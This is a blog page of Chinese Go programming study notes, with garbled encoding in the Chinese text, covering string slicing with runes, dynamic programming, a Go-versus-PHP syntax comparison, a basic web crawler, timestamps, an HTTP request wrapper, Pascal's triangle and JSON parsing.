<h3 id="æˆªå–ä¸­æ–‡"><a href="#æˆªå–ä¸­æ–‡" class="headerlink" title="æˆªå–ä¸­æ–‡"></a>æˆªå–ä¸­æ–‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">first := <span class="string">"fisrt"</span></span><br><span class="line">fmt.Println([]rune(first))</span><br><span class="line">fmt.Println([]byte(first))</span><br><span class="line">[]rune(s), å®ƒå¯ä»¥å°†å­—ç¬¦ä¸²è½¬åŒ–æˆ unicode ç ç‚¹</span><br><span class="line">byte è¡¨ç¤ºä¸€ä¸ªå­—èŠ‚ï¼Œrune è¡¨ç¤ºå››ä¸ªå­—èŠ‚</span><br><span class="line">first := <span class="string">"ç¤¾åŒº"</span></span><br><span class="line">fmt.Println([]rune(first))</span><br><span class="line">fmt.Println([]byte(first))</span><br><span class="line">[<span class="number">31038</span> <span class="number">21306</span>] <span class="comment">//è¾“å‡ºç»“æœ[]rune</span></span><br><span class="line">[<span class="number">231</span> <span class="number">164</span> <span class="number">190</span> <span class="number">229</span> <span class="number">140</span> <span class="number">186</span>]<span class="comment">//è¾“å‡ºç»“æœ[]byte</span></span><br><span class="line">s := <span class="string">"æˆªå–ä¸­æ–‡"</span></span><br><span class="line"><span class="comment">//è¯•è¯•è¿™æ ·èƒ½ä¸èƒ½æˆªå–?</span></span><br><span class="line">fmt.Println(s[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">s := <span class="string">"æˆªå–ä¸­æ–‡"</span></span><br><span class="line"><span class="comment">//è¯•è¯•è¿™æ ·èƒ½ä¸èƒ½æˆªå–? https://www.njphper.com/posts/c251fcd3.html</span></span><br><span class="line">res := []rune(s)</span><br><span class="line">fmt.Println(string(res[:<span class="number">2</span>]))</span><br></pre></td></tr></table></figure>
<h3 id="åŠ¨æ€è§„åˆ’"><a href="#åŠ¨æ€è§„åˆ’" class="headerlink" title="åŠ¨æ€è§„åˆ’"></a>åŠ¨æ€è§„åˆ’</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ç¡¬å¸é—®é¢˜ï¼šå¦‚æœæˆ‘ä»¬æœ‰é¢å€¼ä¸º<span class="number">1</span>å…ƒã€<span class="number">3</span>å…ƒå’Œ<span class="number">5</span>å…ƒçš„ç¡¬å¸è‹¥å¹²æšï¼Œå¦‚ä½•ç”¨æœ€å°‘çš„ç¡¬å¸å‡‘å¤Ÿ<span class="number">11</span>å…ƒï¼Ÿhttps:<span class="comment">//blog.mutoe.com/2019/dynamic-programming/</span></span><br><span class="line"><span class="comment">// CoinChange: coins ç¡¬å¸, amount æœŸæœ›çš„é‡‘é¢, è¿”å›æœ€å°‘éœ€è¦çš„ç¡¬å¸æ•°é‡ï¼Œå¦‚æœä¸å¯è§£è¿”å›-1</span></span><br><span class="line">func CoinChange(coins []int, amount int) int &#123;</span><br><span class="line">  dp := make([]int, amount+<span class="number">1</span>)</span><br><span class="line">  dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= amount; i++ &#123;</span><br><span class="line">    dp[i] = amount + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">coin</span> := range coins &#123;</span><br><span class="line">      <span class="keyword">if</span> coin &lt;= i &amp;&amp; dp[i-coin] != <span class="number">-1</span> &amp;&amp; dp[i-coin]+<span class="number">1</span> &lt; dp[i] &#123;</span><br><span class="line">        dp[i] = dp[i-coin] + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> dp[i] &gt; amount &#123;</span><br><span class="line">      dp[i] = <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> dp[amount]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="go-php-å¯¹æ¯”å­¦ä¹ "><a href="#go-php-å¯¹æ¯”å­¦ä¹ " class="headerlink" title="go php å¯¹æ¯”å­¦ä¹ "></a>go php å¯¹æ¯”å­¦ä¹ </h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/golang/t/23385/from-a-php-engineers-point-of-view-go</span></span><br><span class="line"></span><br><span class="line">first, second = second, first</span><br><span class="line">func getName() (string, string) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>, <span class="string">"world"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">first, last = getName()</span><br><span class="line"><span class="comment">// foreach ($bookings as $key =&gt; $booking) &#123;&#125;</span></span><br><span class="line"><span class="keyword">for</span> key, <span class="attr">booking</span> := range bookings &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for ($i = 0; $i &lt; count($bookings); $i++) &#123;&#125;</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; len(bookings); i++ &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// while ($i &lt; count($bookings)) &#123;&#125;</span></span><br><span class="line"><span class="keyword">for</span> i &lt; len(bookings) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// do &#123;&#125; while (true);</span></span><br><span class="line"><span class="keyword">for</span> &#123;&#125;</span><br><span class="line">type rect struct &#123; <span class="comment">// å®šä¹‰ä¸€ä¸ªç»“æ„ä½“</span></span><br><span class="line">    width  int</span><br><span class="line">    height int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (r *rect) area() int &#123; <span class="comment">// åœ¨ç»“æ„ä½“ä¸Šæ·»åŠ æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> r.width * r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r := rect&#123;<span class="attr">width</span>: <span class="number">10</span>, <span class="attr">height</span>: <span class="number">15</span>&#125; <span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line">fmt.Print(r.area())</span><br><span class="line">type Employee struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">    Job  Job</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Job struct &#123;</span><br><span class="line">    Employer string</span><br><span class="line">    Position string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¹¶å»ç»“æ„åŒ–å®ƒ</span></span><br><span class="line">e := Employee&#123;</span><br><span class="line">    Name: <span class="string">"Sobit"</span>,</span><br><span class="line">    Job: &#123;</span><br><span class="line">        Employer: <span class="string">"GetYourGuide"</span>,</span><br><span class="line">        Position: <span class="string">"Software Engineer"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;func heartbeat() &#123;</span><br><span class="line">     <span class="keyword">for</span> &#123;</span><br><span class="line">         time.Sleep(time.Second)</span><br><span class="line">         fmt.Println(<span class="string">"I'm still running..."</span>)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ç°åœ¨ï¼Œ æˆ‘ä»¬æ€æ ·æ‰èƒ½è®©è¿™ä¸ªå‡½æ•°åœ¨åå°æ‰§è¡Œå¹¶ä¸”å…è®¸æˆ‘ä»¬å¹¶è¡Œçš„åšå…¶ä»–äº‹å‘¢ï¼Ÿ ç­”æ¡ˆæ¯”ä½ æƒ³è±¡ä¸­è¦ç®€å•ï¼Œ åªéœ€è¦åœ¨æ‰§è¡Œå‡½æ•°å‰åŠ ä¸€ä¸ª go :</span><br><span class="line"> </span><br><span class="line"> go heartbeat()</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// ç»§ç»­åšå…¶ä»–äº‹</span></span><br><span class="line"> Go è‡ªå¸¦å¼€ç®±å³ç”¨å…³æ³¨ä»£ç é£æ ¼çš„ go fmt å·¥å…·ã€‚ ä¸å†éœ€è¦åˆ†äº« IDE çš„é…ç½®æ–‡ä»¶ï¼Œ ä¸ç”¨å°è¯•è®°ä½å¤§æ‹¬å·åº”è¯¥æ˜¯åœ¨åŒä¸€è¡Œè¿˜æ˜¯å†èµ·ä¸€è¡Œã€‚</span><br><span class="line"> </span><br><span class="line"> å¯ä»¥ä½¿ç”¨ go doc å»é˜…è¯»æºç åŒ…æ–‡æ¡£ï¼Œ è€Œ go vet å°†ä¼šååŠ©æˆ‘ä»¬æŸ¥æ‰¾ä»£ç ä¸­çš„é—®é¢˜ã€‚ å®‰è£…ç¬¬ä¸‰æ–¹åŒ…åªéœ€è¦æ‰§è¡Œ go get [github.com/[vendor]/[package](http:<span class="comment">//github.com/[vendor]/[package)] æŒ‡ä»¤ï¼Œ æµ‹è¯•åªéœ€è¦æ‰§è¡Œ go test [package] æŒ‡ä»¤ã€‚</span></span><br></pre></td></tr></table></figure>
<h3 id="ç”¨Golangå†™çˆ¬è™«"><a href="#ç”¨Golangå†™çˆ¬è™«" class="headerlink" title="ç”¨Golangå†™çˆ¬è™«"></a>ç”¨Golangå†™çˆ¬è™«</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"io/ioutil"</span></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">	fmt.Println(<span class="string">"Hello, world"</span>)</span><br><span class="line">	url := <span class="string">"http://www.baidu.com/"</span></span><br><span class="line">	download(url)</span><br><span class="line">&#125;</span><br><span class="line">func download(url string) &#123;</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line">	req, <span class="attr">_</span> := http.NewRequest(<span class="string">"GET"</span>, url, nil)</span><br><span class="line">	<span class="comment">// è‡ªå®šä¹‰Header</span></span><br><span class="line">	req.Header.Set(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>)</span><br><span class="line">	resp, <span class="attr">err</span> := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		fmt.Println(<span class="string">"http get error"</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//å‡½æ•°ç»“æŸåå…³é—­ç›¸å…³é“¾æ¥https://zhangslob.github.io/2019/01/16/Golang%E5%86%99%E7%88%AC%E8%99%AB/</span></span><br><span class="line">	defer resp.Body.Close()</span><br><span class="line">	body, <span class="attr">err</span> := ioutil.ReadAll(resp.Body)</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		fmt.Println(<span class="string">"read error"</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(string(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"github.com/jackdanger/collectlinks"</span></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">	fmt.Println(<span class="string">"Hello, world"</span>)</span><br><span class="line">	url := <span class="string">"http://www.baidu.com/"</span></span><br><span class="line">	download(url)</span><br><span class="line">&#125;</span><br><span class="line">func download(url string) &#123;</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line">	req, <span class="attr">_</span> := http.NewRequest(<span class="string">"GET"</span>, url, nil)</span><br><span class="line">	<span class="comment">// è‡ªå®šä¹‰Header</span></span><br><span class="line">	req.Header.Set(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>)</span><br><span class="line">	resp, <span class="attr">err</span> := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		fmt.Println(<span class="string">"http get error"</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//å‡½æ•°ç»“æŸåå…³é—­ç›¸å…³é“¾æ¥</span></span><br><span class="line">	defer resp.Body.Close()</span><br><span class="line">	links := collectlinks.All(resp.Body)</span><br><span class="line">	<span class="keyword">for</span> _, <span class="attr">link</span> := range links &#123;</span><br><span class="line">		fmt.Println(<span class="string">"parse url"</span>, link)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="go-å®ç°ä¸€ä¸ªç®€å•çš„-mvc"><a href="#go-å®ç°ä¸€ä¸ªç®€å•çš„-mvc" class="headerlink" title="go å®ç°ä¸€ä¸ªç®€å•çš„ mvc"></a>go å®ç°ä¸€ä¸ªç®€å•çš„ mvc</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/jc91715/go-simple-mvc</span></span><br><span class="line">go get github.com/astaxie/beego</span><br><span class="line">go get github.com/go-sql-driver/mysql</span><br><span class="line"></span><br><span class="line">go run main.go</span><br><span class="line">https:<span class="comment">//learnku.com/articles/29546</span></span><br></pre></td></tr></table></figure>
<h3 id="æ—¶é—´æˆ³æ“ä½œå¤§å…¨"><a href="#æ—¶é—´æˆ³æ“ä½œå¤§å…¨" class="headerlink" title="æ—¶é—´æˆ³æ“ä½œå¤§å…¨"></a>æ—¶é—´æˆ³æ“ä½œå¤§å…¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dateTime := time.Now()</span><br><span class="line">fmt.Println(dateTime)</span><br><span class="line">year := time.Now().Year() <span class="comment">//å¹´</span></span><br><span class="line"></span><br><span class="line">fmt.Println(year)</span><br><span class="line"></span><br><span class="line">month := time.Now().Month() <span class="comment">//æœˆ</span></span><br><span class="line">fmt.Println(month)</span><br><span class="line"></span><br><span class="line">fmt.Println(time.Now().Format(<span class="string">"2006-01-02 15:04:05"</span>))</span><br><span class="line">t := time.Date(<span class="number">2014</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">4</span>, <span class="number">0</span>, time.Local).Unix()</span><br><span class="line">https:<span class="comment">//learnku.com/golang/t/30925</span></span><br></pre></td></tr></table></figure>
<h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">package http</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"github.com/imroc/req"</span></span><br><span class="line">    logger <span class="string">"xxx"</span> <span class="comment">//loggeræ—¥å¿—å°è£…</span></span><br><span class="line">    util <span class="string">"xxxx/sdk-utils"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type method string</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    GET    method = <span class="string">"GET"</span></span><br><span class="line">    POST   method = <span class="string">"POST"</span></span><br><span class="line">    PUT    method = <span class="string">"PUT"</span></span><br><span class="line">    PATCH  method = <span class="string">"PATCH"</span></span><br><span class="line">    DELETE method = <span class="string">"DELETE"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type Response struct &#123;</span><br><span class="line">    Data []byte</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ååºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line">func (r *Response) Deserialize(object interface&#123;&#125;) (err error) &#123;</span><br><span class="line">    err = util.JSONUnmarshal(r.Data, object)</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ”¯æŒæ‰€æœ‰ç±»å‹è¯·æ±‚.</span></span><br><span class="line">func Request(method method, url string, v ...interface&#123;&#125;) (response *Response, err error) &#123;</span><br><span class="line">    <span class="keyword">var</span> r *req.Resp</span><br><span class="line">    response = <span class="keyword">new</span>(Response)</span><br><span class="line">    <span class="keyword">switch</span> method &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"GET"</span>:</span><br><span class="line">        r, err = req.Get(url, v...)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"POST"</span>:</span><br><span class="line">        r, err = req.Post(url, v...)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"PUT"</span>:</span><br><span class="line">        r, err = req.Put(url, v...)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"PATCH"</span>:</span><br><span class="line">        r, err = req.Patch(url, v...)</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"DELETE"</span>:</span><br><span class="line">        r, err = req.Delete(url, v...)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    statusCode := r.Response().StatusCode</span><br><span class="line">    <span class="keyword">if</span> statusCode != <span class="number">200</span> &#123;</span><br><span class="line">        err = fmt.Errorf(<span class="string">"http cilent code err: %d"</span>, statusCode)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response.Data = r.Bytes()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30935</span></span><br></pre></td></tr></table></figure>
<h3 id="golangä»£ç†"><a href="#golangä»£ç†" class="headerlink" title="golangä»£ç†"></a>golangä»£ç†</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> GO111MODULE=on</span><br><span class="line"><span class="keyword">export</span> GOPROXY=https:<span class="comment">//goproxy.io</span></span><br></pre></td></tr></table></figure>
<h3 id="é€’å½’æ‰“å°æ¨è¾‰ä¸‰è§’"><a href="#é€’å½’æ‰“å°æ¨è¾‰ä¸‰è§’" class="headerlink" title="é€’å½’æ‰“å°æ¨è¾‰ä¸‰è§’"></a>é€’å½’æ‰“å°æ¨è¾‰ä¸‰è§’</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    YangHuiTriangle(<span class="number">10</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/articles/31290</span></span><br><span class="line">func YangHuiTriangle(n int) []int &#123;</span><br><span class="line">    i := n - <span class="number">1</span></span><br><span class="line">    line := make([]int, n)</span><br><span class="line">    <span class="keyword">if</span> i &lt;= <span class="number">0</span> &#123;</span><br><span class="line">        line = []int&#123;<span class="number">1</span>&#125;</span><br><span class="line">        fmt.Println(line)</span><br><span class="line">        <span class="keyword">return</span> line</span><br><span class="line">    &#125;</span><br><span class="line">    down := YangHuiTriangle(i)</span><br><span class="line">    <span class="keyword">for</span> x := <span class="number">0</span>; x &lt; n; x++ &#123;</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span> &#123;</span><br><span class="line">            line[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> x == n<span class="number">-1</span> &#123;</span><br><span class="line">            line[x] = <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        line[x] = down[x<span class="number">-1</span>] + down[x]</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(line)</span><br><span class="line">    <span class="keyword">return</span> line</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="JSON-è§£æ"><a href="#JSON-è§£æ" class="headerlink" title="JSON è§£æ"></a>JSON è§£æ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"encoding/json"</span></span><br><span class="line">    <span class="string">"time"</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    type Fruit struct &#123;</span><br><span class="line">        Name string <span class="string">`json:"Name"`</span></span><br><span class="line">        PriceTag string <span class="string">`json:"PriceTag"`</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    type FruitBasket struct &#123;</span><br><span class="line">        Name    string </span><br><span class="line">        Fruit   map[string]Fruit</span><br><span class="line">        Id      int64 <span class="string">`json:"ref"`</span><span class="comment">// å£°æ˜å¯¹åº”çš„json key</span></span><br><span class="line">        Created time.Time</span><br><span class="line"></span><br><span class="line">    &#125;    </span><br><span class="line">    jsonData := []byte(<span class="string">`</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        "Name": "Standard",</span></span><br><span class="line"><span class="string">        "Fruit" : &#123;</span></span><br><span class="line"><span class="string">        "1": &#123;</span></span><br><span class="line"><span class="string">        "Name": "Apple",</span></span><br><span class="line"><span class="string">        "PriceTag": "$1"</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        "2": &#123;</span></span><br><span class="line"><span class="string">        "Name": "Pear",</span></span><br><span class="line"><span class="string">        "PriceTag": "$1.5"</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        "ref": 999,</span></span><br><span class="line"><span class="string">        "Created": "2018-04-09T23:00:00Z"</span></span><br><span class="line"><span class="string">    &#125;`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> basket FruitBasket</span><br><span class="line">    err := json.Unmarshal(jsonData, &amp;basket)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">         fmt.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">item</span> := range basket.Fruit &#123;</span><br><span class="line">    fmt.Println(item.Name, item.PriceTag)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/articles/31320</span></span><br></pre></td></tr></table></figure>
